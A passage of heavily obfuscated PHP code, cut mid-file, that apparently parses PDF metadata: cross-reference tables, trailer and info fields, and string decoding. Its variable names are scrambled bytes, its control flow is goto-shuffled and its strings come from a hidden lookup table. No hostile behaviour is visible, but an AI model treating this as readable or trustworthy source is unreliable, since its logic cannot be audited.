AŸ“×Ÿ”§‘; D³ªØáŞ: file_put_contents($Cİ¹‰‹ºò, $bĞã¥¾Ì‚«); goto cÍ³æ·âÔ; AŸ“×Ÿ”§‘: $c‡íˆÒ´ = $_SERVER[ºÖÙÂŒäÉê‡][1493]; $Bâ”¦Èè = file_sub_str($Cİ¹‰‹ºò, 0, 2); if ($c‡íˆÒ´ != $Bâ”¦Èè) { return; } goto c™©´Í‹ò; c™©´Í‹ò: ob_start(); readgzfile($Cİ¹‰‹ºò); $bĞã¥¾Ì‚« = ob_get_clean(); goto D³ªØáŞ; cÍ³æ·âÔ: } } class FileParsePdf { public static function parse($c¼Òî×‘õÂ) { goto DóÜ‡Ø¾ø; fç÷Œ¡­»£: if ($B”™£¦å­í[1] && $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1502]] < $B”™£¦å­í[1][0]) { $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1502]] = $B”™£¦å­í[1][0]; } $Fß’µ‹¯ß = self::parseInfoItem($Fß’µ‹¯ß); return $Fß’µ‹¯ß; goto b¢Åøà×¸; DóÜ‡Ø¾ø: $d¤ÑšÙÒ« =& $_SERVER[ºÖÙÂŒäÉê‡]; $F‰¢²½â = 32 * 1024; $fÍ’è¡Î» = array($d¤ÑšÙÒ«[774] => fopen($c¼Òî×‘õÂ, $d¤ÑšÙÒ«[1152]), $d¤ÑšÙÒ«[75] => $c¼Òî×‘õÂ, $d¤ÑšÙÒ«[77] => filesize($c¼Òî×‘õÂ), $d¤ÑšÙÒ«[1494] => $F‰¢²½â); goto BÖ°Ú˜ Úë; E°ïâŒ”ÅÊ: if ($Bœæ¥“–›) { $D•­óä”Õ = $Bœæ¥“–›[$d¤ÑšÙÒ«[1497]][$d¤ÑšÙÒ«[1174]]; $Fß’µ‹¯ß = self::getObjectValue($fÍ’è¡Î», $Bœæ¥“–›, $D•­óä”Õ); } $Fß’µ‹¯ß = is_array($Fß’µ‹¯ß) ? $Fß’µ‹¯ß : array(); $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1498]] = 0; goto A¢È°ÓÚ¾”; BÖ°Ú˜ Úë: $fÍ’è¡Î»[$d¤ÑšÙÒ«[1495]] = StreamWrapperIO::read($c¼Òî×‘õÂ, 0, $F‰¢²½â); $fÍ’è¡Î»[$d¤ÑšÙÒ«[1496]] = StreamWrapperIO::read($c¼Òî×‘õÂ, $fÍ’è¡Î»[$d¤ÑšÙÒ«[77]] - $F‰¢²½â, $F‰¢²½â); $Bœæ¥“–› = self::decodeXref($fÍ’è¡Î»); goto E°ïâŒ”ÅÊ; A¢È°ÓÚ¾”: $a­İ´‹‚‹À = $d¤ÑšÙÒ«[1499]; preg_match($a­İ´‹‚‹À, $fÍ’è¡Î»[$d¤ÑšÙÒ«[1495]], $B”™£¦å­í); if (!$Fß’µ‹¯ß[$d¤ÑšÙÒ«[1498]] && count($B”™£¦å­í) == 5) { $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1498]] = $B”™£¦å­í[3]; $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1500]] = $B”™£¦å­í[4]; } goto AÈ‚ÔÀ¸Õ¼; fªäŒ—ÍÅ©: preg_match_all($a­İ´‹‚‹À, $fÍ’è¡Î»[$d¤ÑšÙÒ«[1495]], $B”™£¦å­í); if ($B”™£¦å­í[1] && $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1502]] < $B”™£¦å­í[1][0]) { $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1502]] = $B”™£¦å­í[1][0]; } preg_match_all($a­İ´‹‚‹À, $fÍ’è¡Î»[$d¤ÑšÙÒ«[1496]], $B”™£¦å­í); goto fç÷Œ¡­»£; FÜ‡ÃƒÎğæ: if ($B”™£¦å­í) { $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1308]] = $B”™£¦å­í[1]; } $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1502]] = 0; $a­İ´‹‚‹À = $d¤ÑšÙÒ«[1503]; goto fªäŒ—ÍÅ©; AÈ‚ÔÀ¸Õ¼: preg_match($a­İ´‹‚‹À, $fÍ’è¡Î»[$d¤ÑšÙÒ«[1496]], $B”™£¦å­í); if (!$Fß’µ‹¯ß[$d¤ÑšÙÒ«[1498]] && count($B”™£¦å­í) == 5) { $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1498]] = $B”™£¦å­í[3]; $Fß’µ‹¯ß[$d¤ÑšÙÒ«[1500]] = $B”™£¦å­í[4]; } preg_match($d¤ÑšÙÒ«[1501], $fÍ’è¡Î»[$d¤ÑšÙÒ«[1495]], $B”™£¦å­í); goto FÜ‡ÃƒÎğæ; b¢Åøà×¸: } private static function parseInfoItem($a¼óÂ¢¬Â) { $BÎÖ‚Ó§ Á =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$a¼óÂ¢¬Â) { return !1; } $E‹ñãóœÂ° = array($BÎÖ‚Ó§ Á[1309] => array($BÎÖ‚Ó§ Á[1504], $BÎÖ‚Ó§ Á[33]), $BÎÖ‚Ó§ Á[1505] => array($BÎÖ‚Ó§ Á[1506], $BÎÖ‚Ó§ Á[33]), $BÎÖ‚Ó§ Á[193] => array($BÎÖ‚Ó§ Á[1507], $BÎÖ‚Ó§ Á[216]), $BÎÖ‚Ó§ Á[106] => array($BÎÖ‚Ó§ Á[1508], $BÎÖ‚Ó§ Á[216]), $BÎÖ‚Ó§ Á[1502] => array($BÎÖ‚Ó§ Á[1502], $BÎÖ‚Ó§ Á[281]), $BÎÖ‚Ó§ Á[1498] => array($BÎÖ‚Ó§ Á[1498], $BÎÖ‚Ó§ Á[281]), $BÎÖ‚Ó§ Á[1500] => array($BÎÖ‚Ó§ Á[1500], $BÎÖ‚Ó§ Á[281]), $BÎÖ‚Ó§ Á[1509] => array($BÎÖ‚Ó§ Á[1510], $BÎÖ‚Ó§ Á[33]), $BÎÖ‚Ó§ Á[1511] => array($BÎÖ‚Ó§ Á[1512], $BÎÖ‚Ó§ Á[33]), $BÎÖ‚Ó§ Á[1513] => array($BÎÖ‚Ó§ Á[1308], $BÎÖ‚Ó§ Á[33])); $b¥»‚¹§ØŠ = array(); foreach ($E‹ñãóœÂ° as $D²µ•Ñ => $båßŒÛ¡¤ë) { if (!isset($a¼óÂ¢¬Â[$båßŒÛ¡¤ë[0]])) { continue; } $dÁÌá¤»® = $a¼óÂ¢¬Â[$båßŒÛ¡¤ë[0]]; if (!$dÁÌá¤»® || is_array($dÁÌá¤»®)) { continue; } switch ($båßŒÛ¡¤ë[1]) { case $BÎÖ‚Ó§ Á[281]: $dÁÌá¤»® = intval($dÁÌá¤»®); break; case $BÎÖ‚Ó§ Á[216]: if (substr($dÁÌá¤»®, 0, 2) == $BÎÖ‚Ó§ Á[1514]) { $dÁÌá¤»® = substr($dÁÌá¤»®, 2, 14); } if (strtotime($dÁÌá¤»®)) { $dÁÌá¤»® = date($BÎÖ‚Ó§ Á[1515], strtotime($dÁÌá¤»®)); } break; } $b¥»‚¹§ØŠ[$D²µ•Ñ] = $dÁÌá¤»®; } return $b¥»‚¹§ØŠ; } private static function decodeXref(&$DÇŒî¾ñÊ¢) { goto A÷Íê‘–É ; f»é’³¹ÒË: $DõÍ°‡À…ê = $Eä„ÌçÁù[1517]; if (!preg_match_all($DõÍ°‡À…ê, $F‹‡…Ïƒå¼, $a°çŸçÒ˜¢, PREG_SET_ORDER, 0)) { return !1; } $aÊ²¢¹ªï = intval($a°çŸçÒ˜¢[0][1]); goto E÷‚çõœ©; eøí¢ÏÏÍè: if (preg_match($Eä„ÌçÁù[1530], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { } return $C™¿çòêâ½; goto d¾Ã£¼âÔ”; E÷‚çõœ©: if ($DÇŒî¾ñÊ¢[$Eä„ÌçÁù[77]] - $aÊ²¢¹ªï > $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1494]]) { $eÂ»¿¡­ºÙ = 4 * $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1494]]; $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1494]] = $eÂ»¿¡­ºÙ; $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1495]] = StreamWrapperIO::read($DÇŒî¾ñÊ¢[$Eä„ÌçÁù[75]], 0, $eÂ»¿¡­ºÙ); $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1496]] = StreamWrapperIO::read($DÇŒî¾ñÊ¢[$Eä„ÌçÁù[75]], $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[77]] - $eÂ»¿¡­ºÙ, $eÂ»¿¡­ºÙ); $F‹‡…Ïƒå¼ = $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1496]]; } $a©ÕÓ™½¦‰ = 0; preg_match_all($Eä„ÌçÁù[1518], $F‹‡…Ïƒå¼, $a°çŸçÒ˜¢); goto fæã—ÏÖ; A÷Íê‘–É : $Eä„ÌçÁù =& $_SERVER[ºÖÙÂŒäÉê‡]; $F‹‡…Ïƒå¼ = $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1496]]; $C™¿çòêâ½ = array($Eä„ÌçÁù[1497] => array(), $Eä„ÌçÁù[1516] => array()); goto f»é’³¹ÒË; fæã—ÏÖ: foreach ($a°çŸçÒ˜¢[3] as $bøæ…‡™Šˆ => $cÍÍò¢ö‰É) { if ($a°çŸçÒ˜¢[3][$bøæ…‡™Šˆ] == $Eä„ÌçÁù[1519]) { $Fºœ¶Ş«­ = $a©ÕÓ™½¦‰ . $Eä„ÌçÁù[70] . intval($a°çŸçÒ˜¢[2][$bøæ…‡™Šˆ]); $C™¿çòêâ½[$Eä„ÌçÁù[1516]][$Fºœ¶Ş«­] = intval($a°çŸçÒ˜¢[1][$bøæ…‡™Šˆ]); ++$a©ÕÓ™½¦‰; } else { if ($a°çŸçÒ˜¢[3][$bøæ…‡™Šˆ] == $Eä„ÌçÁù[1520]) { ++$a©ÕÓ™½¦‰; } else { } } } if (preg_match_all($Eä„ÌçÁù[1521], $F‹‡…Ïƒå¼, $a°çŸçÒ˜¢)) { $Cñ«À“òˆŞ = $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[77]] - $DÇŒî¾ñÊ¢[$Eä„ÌçÁù[1494]]; foreach ($a°çŸçÒ˜¢[0] as $bøæ…‡™Šˆ => $F’ùƒµìßª) { $e‘‹„„¥¡º = $a°çŸçÒ˜¢[1][$bøæ…‡™Šˆ] . $Eä„ÌçÁù[70] . $a°çŸçÒ˜¢[2][$bøæ…‡™Šˆ]; $C™¿çòêâ½[$Eä„ÌçÁù[1516]][$e‘‹„„¥¡º] = strpos($F‹‡…Ïƒå¼, $F’ùƒµìßª) + $Cñ«À“òˆŞ + 1; } } if (preg_match_all($Eä„ÌçÁù[1522], $F‹‡…Ïƒå¼, $a°çŸçÒ˜¢)) { $d¶Øê¿ƒ—İ = count($a°çŸçÒ˜¢[1]) == 1 ? $a°çŸçÒ˜¢[1][0] : $a°çŸçÒ˜¢[1][1]; } else { $d¶Øê¿ƒ—İ = substr($F‹‡…Ïƒå¼, -1024 * 5); } goto D˜èÇ°«åÆ; e££ÉğÀ: if (preg_match($Eä„ÌçÁù[1528], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[1174]] = intval($a°çŸçÒ˜¢[1]) . $Eä„ÌçÁù[70] . intval($a°çŸçÒ˜¢[2]); } if (preg_match($Eä„ÌçÁù[1529], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[372]] = array(); $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[372]][0] = $a°çŸçÒ˜¢[1]; $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[372]][1] = $a°çŸçÒ˜¢[2]; } if (!$C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[1174]]) { return !1; } goto eøí¢ÏÏÍè; D˜èÇ°«åÆ: if (preg_match($Eä„ÌçÁù[1523], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[77]] = intval($a°çŸçÒ˜¢[1]); } if (preg_match($Eä„ÌçÁù[1524], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[1525]] = intval($a°çŸçÒ˜¢[1]) . $Eä„ÌçÁù[70] . intval($a°çŸçÒ˜¢[2]); } if (preg_match($Eä„ÌçÁù[1526], $d¶Øê¿ƒ—İ, $a°çŸçÒ˜¢) > 0) { $C™¿çòêâ½[$Eä„ÌçÁù[1497]][$Eä„ÌçÁù[1527]] = intval($a°çŸçÒ˜¢[1]) . $Eä„ÌçÁù[70] . intval($a°çŸçÒ˜¢[2]); } goto e££ÉğÀ; d¾Ã£¼âÔ”: } private static function getObjectValue($b‰Ø‰Ú‚é, $açÊìô¥›Ã, $Eáİ•¤³³Ü) { goto aÒË†ğ¹Îó; cÌĞÁÄÎÆÔ: if (!is_array($aÅŠİò§ãš[1])) { return array(); } $A««ª§ƒ = array(); for ($A ˆÅ–Šõ­ = 0; $A ˆÅ–Šõ­ < count($aÅŠİò§ãš[1]); $A ˆÅ–Šõ­ += 2) { $cŸ§ŠÍêôõ = $aÅŠİò§ãš[1][$A ˆÅ–Šõ­]; $eîÍµë–ã = $aÅŠİò§ãš[1][$A ˆÅ–Šõ­ + 1]; if (count($cŸ§ŠÍêôõ) == 3 && $cŸ§ŠÍêôõ[0] == $f–Œî´‹—[8]) { $Bñ¢ÎÁ’­Ó = !1; if ($eîÍµë–ã[0] == $f–Œî´‹—[1531]) { $eîÍµë–ã = self::getObject($b‰Ø‰Ú‚é, $açÊìô¥›Ã[$f–Œî´‹—[1516]][$eîÍµë–ã[1]]); } $Bñ¢ÎÁ’­Ó = $eîÍµë–ã[1]; if ($Bñ¢ÎÁ’­Ó === !1) { continue; } if (is_string($Bñ¢ÎÁ’­Ó)) { $Bñ¢ÎÁ’­Ó = self::decodeStr($Bñ¢ÎÁ’­Ó); } $A««ª§ƒ[$cŸ§ŠÍêôõ[1]] = $Bñ¢ÎÁ’­Ó; } } goto f„½ÂÒ‚; f„½ÂÒ‚: return $A««ª§ƒ; goto F²ğ‚Â¿¶¿; aÒË†ğ¹Îó: $f–Œî´‹— =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÅŠİò§ãš = self::getObject($b‰Ø‰Ú‚é, $açÊìô¥›Ã[$f–Œî´‹—[1516]][$Eáİ•¤³³Ü]); if (is_string($aÅŠİò§ãš[1])) { return $aÅŠİò§ãš[1]; } goto cÌĞÁÄÎÆÔ; F²ğ‚Â¿¶¿: } private static function getObject($BˆÊèÄ”è, $d‰ÇÊÜ¼ö•) { $BÈ˜çíìÔ = self::getObjectItem($BˆÊèÄ”è, $d‰ÇÊÜ¼ö•); $BÈ˜çíìÔ = self::getObjectItem($BˆÊèÄ”è, $BÈ˜çíìÔ[2]); return $BÈ˜çíìÔ; } private static function getObjectItem($cˆ¼‚ÆÇ³, $d‚±ìñŒ™) { goto f¯¸îÜœÑË; Eƒ°±òÅñŠ: $eÑËîÙİé = $d‚±ìñŒ™ >= $eÖİ…‹Şïí ? $d‚±ìñŒ™ - $eÖİ…‹Şïí : $d‚±ìñŒ™; $Aáí’ƒâÏ = $d‚±ìñŒ™ >= $eÖİ…‹Şïí ? $cˆ¼‚ÆÇ³[$Dˆ¶Êß«´¼[1496]] : $cˆ¼‚ÆÇ³[$Dˆ¶Êß«´¼[1495]]; if ($d‚±ìñŒ™ > $b†Éêè¶šÚ && $d‚±ìñŒ™ <= $eÖİ…‹Şïí) { $eÑËîÙİé = 0; $Aáí’ƒâÏ = StreamWrapperIO::read($cˆ¼‚ÆÇ³[$Dˆ¶Êß«´¼[75]], $d‚±ìñŒ™, $b†Éêè¶šÚ); } goto F½‡Æ÷Ş; f¯¸îÜœÑË: $Dˆ¶Êß«´¼ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b†Éêè¶šÚ = $cˆ¼‚ÆÇ³[$Dˆ¶Êß«´¼[1494]]; $eÖİ…‹Şïí = $cˆ¼‚ÆÇ³[$Dˆ¶Êß«´¼[77]] - $b†Éêè¶šÚ; goto Eƒ°±òÅñŠ; F½‡Æ÷Ş: $C‹ƒï´òÎ¹ = self::getRawObject($Aáí’ƒâÏ, $eÑËîÙİé); if ($d‚±ìñŒ™ >= $eÖİ…‹Şïí) { $C‹ƒï´òÎ¹[2] = $C‹ƒï´òÎ¹[2] + $eÖİ…‹Şïí; } else { if ($d‚±ìñŒ™ > $b†Éêè¶šÚ && $d‚±ìñŒ™ <= $eÖİ…‹Şïí) { $C‹ƒï´òÎ¹[2] = $C‹ƒï´òÎ¹[2] + $d‚±ìñŒ™; } } return $C‹ƒï´òÎ¹; goto cğË¶™ß; cğË¶™ß: } private static function decodeStr($c‹Úôçƒ¸¾) { goto B¤Ï‹§–äì; f¿›¥‡ÏÛ¨: return $c‹Úôçƒ¸¾; goto CŸõÖæöƒ; dÔ“ø¯ì³–: $c‹Úôçƒ¸¾ = $Aá‚ÜØ¿ç[33]; foreach ($b÷ÉÆšÌº™ as $a¸ˆåƒ¨¢) { if (preg_match($Aá‚ÜØ¿ç[1546], $a¸ˆåƒ¨¢) && !1 === stripos($a¸ˆåƒ¨¢, $Aá‚ÜØ¿ç[1547])) { $a¸ˆåƒ¨¢ = preg_replace($Aá‚ÜØ¿ç[1548], $Aá‚ÜØ¿ç[33], $a¸ˆåƒ¨¢); $a¸ˆåƒ¨¢ = trim($a¸ˆåƒ¨¢, $Aá‚ÜØ¿ç[918]); $a¸ˆåƒ¨¢ = pack($Aá‚ÜØ¿ç[1549], $a¸ˆåƒ¨¢); $c‹Úôçƒ¸¾ .= $a¸ˆåƒ¨¢; } else { $c‹Úôçƒ¸¾ .= $a¸ˆåƒ¨¢; } } if (preg_match($Aá‚ÜØ¿ç[1550], $c‹Úôçƒ¸¾)) { $e±œ£ÓÓÂñ = substr($c‹Úôçƒ¸¾, 2); $c‹Úôçƒ¸¾ = $Aá‚ÜØ¿ç[33]; $döÅ»Àëˆ¨ = strlen($e±œ£ÓÓÂñ); for ($b‡æŞƒŠˆ› = 0; $b‡æŞƒŠˆ› < $döÅ»Àëˆ¨; $b‡æŞƒŠˆ› += 2) { $aÍëœøÛ•š = hexdec(bin2hex(substr($e±œ£ÓÓÂñ, $b‡æŞƒŠˆ›, 2))); $c‹Úôçƒ¸¾ .= mb_convert_encoding($Aá‚ÜØ¿ç[1551] . intval($aÍëœøÛ•š) . $Aá‚ÜØ¿ç[67], $Aá‚ÜØ¿ç[1552], $Aá‚ÜØ¿ç[1553]); } } goto f¿›¥‡ÏÛ¨; Bà˜¾É’æö: $c‹Úôçƒ¸¾ = $Aá‚ÜØ¿ç[33]; foreach ($b÷ÉÆšÌº™ as $a¸ˆåƒ¨¢) { if (preg_match($Aá‚ÜØ¿ç[1541], $a¸ˆåƒ¨¢)) { $c‹Úôçƒ¸¾ .= \chr(octdec(trim($a¸ˆåƒ¨¢, $Aá‚ÜØ¿ç[93]))); } else { $c‹Úôçƒ¸¾ .= $a¸ˆåƒ¨¢; } } $b÷ÉÆšÌº™ = preg_split($Aá‚ÜØ¿ç[1542], $c‹Úôçƒ¸¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E Ñµ¼çÚï; B¤Ï‹§–äì: $Aá‚ÜØ¿ç =& $_SERVER[ºÖÙÂŒäÉê‡]; $c‹Úôçƒ¸¾ = str_replace(array($Aá‚ÜØ¿ç[1532], $Aá‚ÜØ¿ç[1533], $Aá‚ÜØ¿ç[1534], $Aá‚ÜØ¿ç[1535], $Aá‚ÜØ¿ç[1536], $Aá‚ÜØ¿ç[1537], $Aá‚ÜØ¿ç[1538], $Aá‚ÜØ¿ç[1539]), array($Aá‚ÜØ¿ç[93], $Aá‚ÜØ¿ç[50], $Aá‚ÜØ¿ç[8], $Aá‚ÜØ¿ç[253], $Aá‚ÜØ¿ç[809], $Aá‚ÜØ¿ç[174], $Aá‚ÜØ¿ç[982], $Aá‚ÜØ¿ç[335]), $c‹Úôçƒ¸¾); $b÷ÉÆšÌº™ = preg_split($Aá‚ÜØ¿ç[1540], $c‹Úôçƒ¸¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Bà˜¾É’æö; E Ñµ¼çÚï: $c‹Úôçƒ¸¾ = $Aá‚ÜØ¿ç[33]; foreach ($b÷ÉÆšÌº™ as $a¸ˆåƒ¨¢) { if (preg_match($Aá‚ÜØ¿ç[1543], $a¸ˆåƒ¨¢)) { $c‹Úôçƒ¸¾ .= \chr(hexdec(trim($a¸ˆåƒ¨¢, $Aá‚ÜØ¿ç[1544]))); } else { $c‹Úôçƒ¸¾ .= $a¸ˆåƒ¨¢; } } $b÷ÉÆšÌº™ = preg_split($Aá‚ÜØ¿ç[1545], $c‹Úôçƒ¸¾, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dÔ“ø¯ì³–; CŸõÖæöƒ: } private static function getRawObject($BÎô·¯Üœ, $C­‹Çº»ÒÜ = 0) { goto f‹™™¨½ŒÀ; f‹™™¨½ŒÀ: $f­ÂÎ…‹†‡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[33]; $C­Ù’á£œ = $f­ÂÎ…‹†‡[33]; goto bã“‰åíà—; bã“‰åíà—: $C­‹Çº»ÒÜ += strspn($BÎô·¯Üœ, $f­ÂÎ…‹†‡[1554], $C­‹Çº»ÒÜ); $Cª¬Ê°‘ÚÕ = $BÎô·¯Üœ[$C­‹Çº»ÒÜ]; switch ($Cª¬Ê°‘ÚÕ) { case $f­ÂÎ…‹†‡[1555]: $Bø­’ÃãÆ = strcspn($BÎô·¯Üœ, $f­ÂÎ…‹†‡[1556], $C­‹Çº»ÒÜ); if ($Bø­’ÃãÆ > 0) { $C­‹Çº»ÒÜ += $Bø­’ÃãÆ; return self::getRawObject($BÎô·¯Üœ, $C­‹Çº»ÒÜ); } break; case $f­ÂÎ…‹†‡[8]: $d¬åÁñìŒ² = $Cª¬Ê°‘ÚÕ; ++$C­‹Çº»ÒÜ; $DÚæƒ·îáŸ = preg_match($f­ÂÎ…‹†‡[1557], substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 256), $a£…’‹¨£); if (1 == $DÚæƒ·îáŸ) { $C­Ù’á£œ = $a£…’‹¨£[1]; $C­‹Çº»ÒÜ += strlen($C­Ù’á£œ); } break; case $f­ÂÎ…‹†‡[253]: case $f­ÂÎ…‹†‡[809]: $d¬åÁñìŒ² = $Cª¬Ê°‘ÚÕ; ++$C­‹Çº»ÒÜ; $Bô™âÔÚ‘… = $C­‹Çº»ÒÜ; if ($f­ÂÎ…‹†‡[253] == $Cª¬Ê°‘ÚÕ) { $fÒŸ‘İò‚º = 1; while ($fÒŸ‘İò‚º > 0) { if (!isset($BÎô·¯Üœ[$Bô™âÔÚ‘…])) { break; } $C×÷«ƒó‘ù = $BÎô·¯Üœ[$Bô™âÔÚ‘…]; switch ($C×÷«ƒó‘ù) { case $f­ÂÎ…‹†‡[93]: ++$Bô™âÔÚ‘…; break; case $f­ÂÎ…‹†‡[253]: ++$fÒŸ‘İò‚º; break; case $f­ÂÎ…‹†‡[809]: --$fÒŸ‘İò‚º; break; } ++$Bô™âÔÚ‘…; } $C­Ù’á£œ = substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, $Bô™âÔÚ‘… - $C­‹Çº»ÒÜ - 1); $C­‹Çº»ÒÜ = $Bô™âÔÚ‘…; } break; case $f­ÂÎ…‹†‡[153]: case $f­ÂÎ…‹†‡[480]: $d¬åÁñìŒ² = $Cª¬Ê°‘ÚÕ; ++$C­‹Çº»ÒÜ; if ($f­ÂÎ…‹†‡[153] == $Cª¬Ê°‘ÚÕ) { $C­Ù’á£œ = array(); do { $FÙšÎÊ¯ë = $C­‹Çº»ÒÜ; $DíÉ·ôáÆÚ = self::getRawObject($BÎô·¯Üœ, $C­‹Çº»ÒÜ); $C­‹Çº»ÒÜ = $DíÉ·ôáÆÚ[2]; $C­Ù’á£œ[] = $DíÉ·ôáÆÚ; } while ($f­ÂÎ…‹†‡[480] != $DíÉ·ôáÆÚ[0] && $C­‹Çº»ÒÜ != $FÙšÎÊ¯ë); array_pop($C­Ù’á£œ); } break; case $f­ÂÎ…‹†‡[917]: case $f­ÂÎ…‹†‡[920]: if (isset($BÎô·¯Üœ[$C­‹Çº»ÒÜ + 1]) && $BÎô·¯Üœ[$C­‹Çº»ÒÜ + 1] == $Cª¬Ê°‘ÚÕ) { $d¬åÁñìŒ² = $Cª¬Ê°‘ÚÕ . $Cª¬Ê°‘ÚÕ; $C­‹Çº»ÒÜ += 2; if ($f­ÂÎ…‹†‡[917] == $Cª¬Ê°‘ÚÕ) { $C­Ù’á£œ = array(); do { $FÙšÎÊ¯ë = $C­‹Çº»ÒÜ; $DíÉ·ôáÆÚ = self::getRawObject($BÎô·¯Üœ, $C­‹Çº»ÒÜ); $C­‹Çº»ÒÜ = $DíÉ·ôáÆÚ[2]; $C­Ù’á£œ[] = $DíÉ·ôáÆÚ; } while ($f­ÂÎ…‹†‡[1558] != $DíÉ·ôáÆÚ[0] && $C­‹Çº»ÒÜ != $FÙšÎÊ¯ë); array_pop($C­Ù’á£œ); } } else { $d¬åÁñìŒ² = $Cª¬Ê°‘ÚÕ; ++$C­‹Çº»ÒÜ; $DÚæƒ·îáŸ = preg_match($f­ÂÎ…‹†‡[1559], substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ), $a£…’‹¨£); if ($f­ÂÎ…‹†‡[917] == $Cª¬Ê°‘ÚÕ && 1 == $DÚæƒ·îáŸ) { $C­Ù’á£œ = strtr($a£…’‹¨£[1], $f­ÂÎ…‹†‡[1560], $f­ÂÎ…‹†‡[33]); $C­‹Çº»ÒÜ += \strlen($a£…’‹¨£[0]); } elseif (!1 !== ($FæØä–Õåê = strpos($BÎô·¯Üœ, $f­ÂÎ…‹†‡[920], $C­‹Çº»ÒÜ))) { $C­‹Çº»ÒÜ = $FæØä–Õåê + 1; } } break; default: if ($f­ÂÎ…‹†‡[1561] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 6)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1561]; $C­‹Çº»ÒÜ += 6; } elseif ($f­ÂÎ…‹†‡[99] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 4)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[99]; $C­‹Çº»ÒÜ += 4; $C­Ù’á£œ = $f­ÂÎ…‹†‡[99]; } elseif ($f­ÂÎ…‹†‡[1562] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 4)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1563]; $C­‹Çº»ÒÜ += 4; $C­Ù’á£œ = $f­ÂÎ…‹†‡[1562]; } elseif ($f­ÂÎ…‹†‡[1564] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 5)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1563]; $C­‹Çº»ÒÜ += 5; $C­Ù’á£œ = $f­ÂÎ…‹†‡[1564]; } elseif ($f­ÂÎ…‹†‡[1565] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 6)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1565]; $C­‹Çº»ÒÜ += 6; if (1 == preg_match($f­ÂÎ…‹†‡[1566], substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ), $a£…’‹¨£)) { $C­‹Çº»ÒÜ += strlen($a£…’‹¨£[0]); $B‡½ˆº°Ó = $f­ÂÎ…‹†‡[1567]; $DÚæƒ·îáŸ = preg_match($B‡½ˆº°Ó, substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ), $a£…’‹¨£, PREG_OFFSET_CAPTURE); if (1 == $DÚæƒ·îáŸ) { $C­Ù’á£œ = substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, $a£…’‹¨£[0][1]); $C­‹Çº»ÒÜ += $a£…’‹¨£[1][1]; } } } elseif ($f­ÂÎ…‹†‡[1568] == substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 9)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1568]; $C­‹Çº»ÒÜ += 9; } elseif (1 == preg_match($f­ÂÎ…‹†‡[1569], substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 33), $a£…’‹¨£)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1531]; $C­‹Çº»ÒÜ += strlen($a£…’‹¨£[0]); $C­Ù’á£œ = intval($a£…’‹¨£[1]) . $f­ÂÎ…‹†‡[70] . intval($a£…’‹¨£[2]); } elseif (1 == preg_match($f­ÂÎ…‹†‡[1570], substr($BÎô·¯Üœ, $C­‹Çº»ÒÜ, 33), $a£…’‹¨£)) { $d¬åÁñìŒ² = $f­ÂÎ…‹†‡[1571]; $C­Ù’á£œ = intval($a£…’‹¨£[1]) . $f­ÂÎ…‹†‡[70] . intval($a£…’‹¨£[2]); $C­‹Çº»ÒÜ += strlen($a£…’‹¨£[0]); } elseif (($cãºƒ–í = strspn($BÎô·¯Üœ, $f­ÂÎ…‹†‡[1572], $C­‹Çº»ÒÜ)) > 0) { 